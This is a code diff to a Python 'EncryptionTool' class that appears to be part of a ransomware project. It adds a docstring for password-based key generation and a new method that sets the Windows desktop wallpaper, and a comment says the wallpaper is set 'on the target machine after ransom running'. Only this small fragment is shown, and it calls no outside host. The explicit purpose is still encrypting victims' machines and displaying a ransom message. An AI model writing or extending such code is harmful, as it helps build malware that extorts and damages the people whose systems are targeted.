@@ -138,6 +138,10 @@ class EncryptionTool:
 
     #@staticmethod
     def generate_key(self, password):
+        """ this function generates a key from the password as argument which is PASSWORD_PROVIDED
+        :param: password
+        :return: key
+        """
         try:
             # Create 16 bytes Salt
             salt = get_random_bytes(16)
@@ -153,6 +157,17 @@ class EncryptionTool:
             # Submit a Error log message in Log Console
             logging.error(f"[-] Encryption: Encryption Key Generation Failed: Error {str(e)}")
             raise
+
+    # Create Function to Set Wallpaper on the target machine after ransom running
+    @staticmethod
+    def set_wallpaper(self, path):
+        try:
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+            logging.info(f"[+] Wallpaper Set Successfully to {path}. ")
+        except Exception as e:
+            logging.error(f"[-] Wallpaper Set Failed: Error {str(e)}")
+
+
 
 
 if __name__ == "__main__":
